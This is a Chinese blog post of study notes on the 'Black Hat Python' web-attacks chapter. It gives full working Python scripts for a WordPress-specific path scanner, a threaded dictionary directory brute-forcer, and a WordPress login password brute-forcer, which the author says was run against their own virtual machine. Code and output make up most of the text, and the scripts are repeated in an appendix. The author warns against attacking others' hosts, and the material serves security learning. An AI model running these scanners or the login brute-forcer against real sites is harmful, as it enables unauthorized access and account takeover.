---
title: 第 4 章 Web 攻击
tags: 
- [python]
- [black_hat_python]
categories: 
- [python]
- [black_hat_python] 
date: 2022-06-23
mathjax: true
comment: true
---

个人的知识笔记。

<!-- more -->

# 1. 开源 Web 应用路径扫描
我们平常用的路径扫描工具都是利用一个比较大的字典，里面包括了可能存在的目录和文件名，利用该字典去扫描目标网站，根据返回的状态码判断目标网站是否存在对应的路径。

本小节我们将会实现类似的一个功能，不过不同的是我们针对的是某一个开源的 CMS (Content Management System)。以 wordpress 为例，我们首先去官网下载一套源码：[Blog Tool, Publishing Platform, and CMS | WordPress.org](https://wordpress.org/) ，然后编写如下代码：

```python
import contextlib, os, queue, requests, sys, threading, time
FILETERED = ['.jpg', 'gif', 'png', 'css']
TARGET = 'http://target'  # 目标网站
THREADS = 10
answers = queue.Queue()
web_paths = queue.Queue()

def gather_paths():
    for root, dirs, files in os.walk('.'):
        for fname in files:
            if os.path.splitext(fname)[1] in FILETERED:
                continue
            path = os.path.join(root, fname)
            if path.startswith('.'):
                path = path[1:]
            print(path)
            web_paths.put(path)

@contextlib.contextmanager # 上下文管理器
def chdir(path):
    '''
    On enter, change directory to specified path.
    On exit, change directory back to original.
    '''
    this_dir = os.getcwd()
    os.chdir(path)
    try:
        yield # ？？？
    finally:
        os.chdir(this_dir)

if __name__ == '__main__':
    with chdir('/home/m1ku/Downloads/wordpress/'):
        gather_paths()
    input('Press return to continue')
```

上述代码的主要作用就是**从下载的 CMS 的整个目录中找到我们感兴趣的后缀的文件，然后将这些文件名用一个队列保存 `web_paths`**，这个作用主要是通过 `gather_paths()` 函数实现。而 `chdir()` 函数的作用是 **改变脚本运行的目录**。

CMS 和当前脚本并不在一个目录，而 `gather_paths()` 函数没有改变目录的代码，`for root, dirs, files in os.walk('.')` 这里面的 `.` 表示的是当前目录，如果没有改变工作目录的话，那么这句代码就会遍历脚本所在目录，而不是 CMS 目录。所以，改变工作目录的的活由 `chdir()` 完成。

`@contextlib.contextmanager` 表示 `chdir()` 函数可以使用 `with` 具备上下文管理器，以一句常见的代码为例作解释，如果我们要读取一个文件的内容，需要三步：

1. 打开文件
2. 读取内容
3. 关闭文件

```python
f = open('myanswers.txt', 'r')  
content = f.read()  
print(content)
f.close
```

而我们一般都不会这样子写，更常见的写法如下：

```python
with open('myanswers.txt', 'r') as f:  
    content = f.read()  
    print(content)
```

这个 `with` 语句其实就是一个上下文管理器，我们只需要使用该语句打开文件然后进行操作，关闭的操作不需要我们手动完成，由上下文管理器来完成，当我们退出这个 `with` 语句的有效范围的时候，自动关闭文件。

>finally: 不论 try 成功或者失败，都会执行。保证了函数退出时能够把工作路径切换回来。

上述代码中设置了 4 个后缀，如果文件包含其中某个后缀，说明这些文件是我们所不关心的，当然，这里可以自定义，如果只关心后缀为 `php` 的，也可以自己设置。至此，我们获得了开源 CMS 的我们关心的文件名，这可以说是针对这一个 CMS 的字典。

接下来，我们需要使用这个字典去扫描目标网站，下面两个函数就是实现这个功能

```python
def test_remote():
    while not web_paths.empty():
        path = web_paths.get()
        url = f'{TARGET}{path}'
        time.sleep(2)
        r = requests.get(url)
        if r.status_code == 200:
            answers.put(url)
            sys.stdout.write('+')
        else:
            sys.stdout.write('x')
        sys.stdout.flush()

def run():
    mythreads = list()
    for i in range(THREADS):
        print(f'Spawning thread {i}')
        t = threading.Thread(target=test_remote)
        mythreads.append(t)
        t.start()

    for thread in mythreads:
        thread.join()
```

这里使用多线程操作，能够使扫描速度加快。其次，如果速度太快，可能会IP会被目标网站封锁，因此这里 `time.sleep(2)` 就是降低速度，保证不被封锁。如果最后返回的状态码是 200，说明目标网站存在对应的文件，将这些文件写入到 `answers` 队列中。

```python
if __name__ == '__main__':
    with chdir('/home/m1ku/Downloads/wordpress/'):
        gather_paths()
    input('Press return to continue')
    run()
    with open('myanswers.txt', 'w') as f:
        while not answers.empty():
            f.write(f'{answers.get()}\n')
    print('done')
```

最后，将 `answers` 队列中的内容保存到 `myanswers.txt` 中。至此，针对开源 CMS 的路径扫描就完成了我们查看一下结果（保护隐私会打上马赛克），有的文件是需要用户名和密码登录的，因此运行过程中会出现异常，这后期可以优化，这里就不管了。

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623201946.png)

而 myanswers.txt 中也得到了对应的结果

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623202107.png)

# 2. 暴力路径扫描
上一节是针对某个开源 CMS 的路径扫描，我们可以通过下载源码得到目标网站中大概率存在的文件。但日常情况下，更有可能是面对的是一个没有使用开源 CMS 的网站，这种情况下只能使用字典进行暴力扫描。接下来，我们就会尝试编写这样一个工具。

```python
AGENT = 'Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 FIrefox/19.0'
EXTENSIONS = ['.php', '.bak', '.orig', '.inc'] # 感兴趣的后缀
TARGET = 'http://testphp.vulnweb.com/' # 目标网站
THREADS = 50
WORDLIST = '/usr/share/dirb/wordlists/small.txt' # 使用一个小点的字典

def get_words(resume=None):
    def extend_words(word): # 嵌套函数
        if '.' in word:
            words.put(f'/{word}')
        else:
            words.put(f'/{word}/')

        for extension in EXTENSIONS:
            words.put(f'/{word}{extension}')
            
    with open(WORDLIST) as f:
        raw_words = f.read()

    found_resume = False
    words = queue.Queue()
    for word in raw_words.split():
        if resume is not None:
            if found_resume:
                extend_words(word)
            elif word == resume:
                found_resume = True
                print(f'Resuming wordlist from: {resume}')
        else:
            print(word)
            extend_words(word)
    return words
```

1. `extend_words()` 函数的作用：在现有字典的内容上进行修改。word 为字典中的一个元素，假设它为 `name.ext` ，那么这就是一个文件，因此将 `/name.ext` 加入队列；如果它是 `name` ，那么这就是一个目录，因此将 `/name/` 加入队列（其实没差）。此外，有些时候网站会存在备份文件，比如 `index.php` 经过备份可能有 `index.php.bak` ，因此我们会在字典的内容上加上我们感兴趣的后缀，也加入队列
2. `extend_words()` 是一个嵌套函数。这个函数只有 `get_words()` 使用，因此，直接写在内部。
3. `resume` 的作用主要是出错的时候，不用从头读取字典中的元素，直接 `resume=name` 即可从字典中的 `name` 开始读取。

```python
def dir_bruter(words):
    headers = {'User-Agent': AGENT}
    while not words.empty():
        url = f'{TARGET}{words.get()}'
        try:
            r = requests.get(url, headers=headers)
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            sys.stderr.write('x')
            sys.stderr.flush()
            continue
        if r.status_code == 200:
            print(f'\nSuccess ({url}: {r.status_code})')
        elif r.status_code == 404:
            sys.stderr.write('.')
            sys.stderr.flush()
        else:
            print(f'\n{url} => {r.status_code}')
```

`dir_burter()` 的作用主要就是根据 `get_words()` 函数返回的队列，依次去访问队列中的文件名，如果状态码为 200 表示成功， 404 表示失败，其他则显示出来。

```python
if __name__ == '__main__':  
    words = get_words()  
    print('Press enter to continue.')  
    sys.stdin.readline()  
    for _ in range(THREADS):  
        t = threading.Thread(target=dir_bruter, args=(words,))  
        t.start()
```

运行结果：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623211849.png)

200 和其他状态码会显示出来，而 404 则会用 `.` 表示。小技巧，如果不想看到标准错误，可以执行：

```shell
python3 bruter.py 2>/dev/null # 将标准错误重定向到 /dev/null
```

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623212441.png)

# 3. HTML 表单认证爆破
>不要尝试对别人的主机进行爆破！不要尝试对别人的主机进行爆破！不要尝试对别人的主机进行爆破！我爆破的是自己的虚拟机。

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623225237.png)

>需要注意，现在很多的网站都做了许多工作防止爆破。最常见的就是各种验证码、google的选择各种图片还有错误次数限制。所幸 wordpress 并没有这些，wordpress 只有一个 testcookie，这个可以在页面源码中得到，我们 post 请求的时候需要带上这个值，否则即使密码正确也无法登录。

访问 `http://target/wp-login.php`，然后查看页面源码，找到表单提交的部分（`form`）

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623225825.png)

这里面需要提交的参数是（`input` 标签中的 `name` 属性的值）：

- `log` 用户名
- `pwd` 密码
- `rememberme` 网页中的 “记住我” 
- `wp-submit` 网页中的 “登录”
- `redirect_to` 登录成功之后需要重定向到的页面
- `testcookie`

这些参数的值就在对应的 `input` 标签中的 `value` 属性中携带，如果 `value` 为空，则说明需要我们填写（比如用户名和密码）。

因此，HTML 表单认证爆破需要做这些事：

1. 获得（密码）字典内容
2. 先请求登录界面，使用 `session`，可以保证 TCP 连接不断开，因此 `testcookie` 也就不会发生变化。将源码中的上述 6 个参数和对应的值保存
3. 一般而言，用户名不变，因此将用户名参数的值填入，然后每次爆破都需要将字典中的内容当作密码填入。这 6 个参数将作为 post 请求的 `data` 
4. 如果密码正确，则会重定向那另一个界面，这个界面中有这么一串内容 “欢迎使用WordPress！”。因此，可以把这串内容作为判定依据。如果 post 请求得到的内容没有这句话，则密码错误，否则密码正确，爆破结束。

获得密码字典内容：

```python
def get_words():
    with open(WORDLIST, 'r') as f:
        raw_words = f.read()

    words = queue.Queue()
    for word in raw_words.split():
        words.put(word)
    return words
```

从页面源码中获得参数名和值：

```python
def get_params(content):
    params = dict()
    soup = BeautifulSoup(content, 'lxml')
    for item in soup.find_all('input'): # 只有这 6 个是 input 标签
        name = item.get('name') # 获得 name 属性的值
        if name is not None:
            params[name] = item.get('value') # 获得 value 属性的值
    return params
```

这个函数的执行结果为：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623231359.png)

接下来就是重要的爆破的代码：

```python
class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack begining on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, ))
            t.start()

    def web_bruter(self, passwords):
        session = requests.session()
        r0 = session.get(self.url)
        params = get_params(r0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password: {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            r1 = session.post(self.url, data=params)
            if SUCCESS in r1.content.decode():
                self.found = True
                print(f'\nBruteforcing successful.')
                print(f'Username is {self.username}')
                print(f'Password is {passwd}\n')
                print('done: now cleaning up other threads...') # 并没有 cleaning up，这就是一句空话
```

主要就是 `web_bruter()` 方法，首先 ` r0 = session.get(self.url)` 就是第一次访问登录界面，然后调用 `params = get_params(r0.content)` 获得参数，接着 ` params['log'] = self.username` 填入用户名，随后就可以开始爆破了。每次爆破都从 passwords 队列中获得一个密码，然后 `params['pwd'] = passwd` 填入密码，使用`r1 = session.post(self.url, data=params)` 尝试登录，如果 `if SUCCESS in r1.content.decode()` 则密码正确， `SUCCESS` 就是 `'欢迎使用WordPress！'`，否则继续爆破。

```python
if __name__ == '__main__':
    words = get_words() # 获得密码的队列
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words) # 尝试爆破
```

运行结果：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220623232220.png)

利用这个密码可以成功登录。后期可以优化一下，找到密码则退出运行中的所有线程。

# 4. 附件
## 4.1. 开源 CMS 路径扫描源码
```python
import contextlib, os, queue, requests, sys, threading, time

FILETERED = ['.jpg', 'gif', 'png', 'css']
TARGET = 'http://target'
THREADS = 10
answers = queue.Queue()
web_paths = queue.Queue()

def gather_paths():
    for root, dirs, files in os.walk('.'):
        for fname in files:
            if os.path.splitext(fname)[1] in FILETERED:
                continue
            path = os.path.join(root, fname)
            if path.startswith('.'):
                path = path[1:]
            print(path)
            web_paths.put(path)

@contextlib.contextmanager
def chdir(path):
    '''
    On enter, change directory to specified path.
    On exit, change directory back to original.
    '''
    this_dir = os.getcwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(this_dir)

def test_remote():
    while not web_paths.empty():
        path = web_paths.get()
        url = f'{TARGET}{path}'
        time.sleep(2)
        # print(f'test: {url}')
        r = requests.get(url)
        if r.status_code == 200:
            answers.put(url)
            sys.stdout.write('+')
        else:
            sys.stdout.write('x')
        sys.stdout.flush()

def run():
    mythreads = list()
    for i in range(THREADS):
        print(f'Spawning thread {i}')
        t = threading.Thread(target=test_remote)
        mythreads.append(t)
        t.start()

    for thread in mythreads:
        thread.join()

if __name__ == '__main__':
    with chdir('/home/m1ku/Downloads/wordpress/'):
        gather_paths()
    input('Press return to continue')
    run()
    with open('myanswers.txt', 'w') as f:
        while not answers.empty():
            f.write(f'{answers.get()}\n')
    print('done')
```

## 4.2. 暴力路径扫描
```python
import queue, requests, threading, sys, time

AGENT = 'Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 FIrefox/19.0'
EXTENSIONS = ['.php', '.bak', '.orig', '.inc'] # 感兴趣的后缀
TARGET = 'http://testphp.vulnweb.com/'  # 目标网站
THREADS = 50
WORDLIST = '/usr/share/dirb/wordlists/small.txt' # 使用一个小点的字典

def get_words(resume=None):

    def extend_words(word):
        if '.' in word:
            words.put(f'/{word}')
        else:
            words.put(f'/{word}/')

        for extension in EXTENSIONS:
            words.put(f'/{word}{extension}')

    with open(WORDLIST) as f:
        raw_words = f.read()

    found_resume = False
    words = queue.Queue()
    for word in raw_words.split():
        if resume is not None:
            if found_resume:
                extend_words(word)
            elif word == resume:
                found_resume = True
                print(f'Resuming wordlist from: {resume}')
        else:
            print(word)
            extend_words(word)
    return words

def dir_bruter(words):
    headers = {'User-Agent': AGENT}
    while not words.empty():
        url = f'{TARGET}{words.get()}'
        try:
            r = requests.get(url, headers=headers)
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            sys.stderr.write('x')
            sys.stderr.flush()
            continue
        if r.status_code == 200:
            print(f'\nSuccess ({url}: {r.status_code})')
        elif r.status_code == 404:
            sys.stderr.write('.')
            sys.stderr.flush()
        else:
            print(f'\n{url} => {r.status_code}')

if __name__ == '__main__':
    words = get_words()
    print('Press enter to continue.')
    sys.stdin.readline()
    for _ in range(THREADS):
        t = threading.Thread(target=dir_bruter, args=(words,))
        t.start()
```

## 4.3. HTML 表单认证爆破
```python
from bs4 import BeautifulSoup
import queue, requests, sys, threading, time

SUCCESS = '欢迎使用WordPress！'
TARGET = 'http://10.0.2.21/wp-login.php'
WORDLIST = 'wordlist_test.txt'

def get_words():
    with open(WORDLIST, 'r') as f:
        raw_words = f.read()

    words = queue.Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    soup = BeautifulSoup(content, 'lxml')
    for item in soup.find_all('input'):
        name = item.get('name')
        if name is not None:
            params[name] = item.get('value')
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack begining on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, ))
            t.start()

    def web_bruter(self, passwords):
        session = requests.session()
        r0 = session.get(self.url)
        params = get_params(r0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password: {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            r1 = session.post(self.url, data=params)
            if SUCCESS in r1.content.decode():
                self.found = True
                print(f'\nBruteforcing successful.')
                print(f'Username is {self.username}')
                print(f'Password is {passwd}\n')
                print('done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words)
```